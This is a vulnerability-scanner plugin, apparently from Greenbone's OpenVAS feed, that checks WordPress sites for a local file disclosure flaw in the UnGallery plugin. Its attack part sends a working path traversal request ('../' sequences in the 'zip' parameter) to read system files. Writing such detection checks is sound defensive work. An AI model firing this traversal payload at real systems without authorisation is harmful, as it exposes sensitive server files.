# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103221");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-08-23 15:25:10 +0200 (Tue, 23 Aug 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("WordPress UnGallery 'zip' Parameter Local File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49271");
  script_xref(name:"URL", value:"http://plugins.trac.wordpress.org/changeset?reponame=&new=400553%40ungallery&old=397601%40ungallery");
  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/ungallery/changelog/");

  script_tag(name:"summary", value:"The UnGallery plug-in for WordPress is prone to a local file-
  disclosure vulnerability because it fails to adequately validate user-supplied input.");

  script_tag(name:"impact", value:"Exploiting this vulnerability would allow an attacker to obtain
  potentially sensitive information from local files on computers
  running the vulnerable application. This may aid in further attacks.");

  script_tag(name:"affected", value:"Versions prior to UnGallery 1.5.8 are vulnerable.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/wp-content/plugins/ungallery/source.php?zip=", crap(data:"../", length:3*9), files[file]);

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
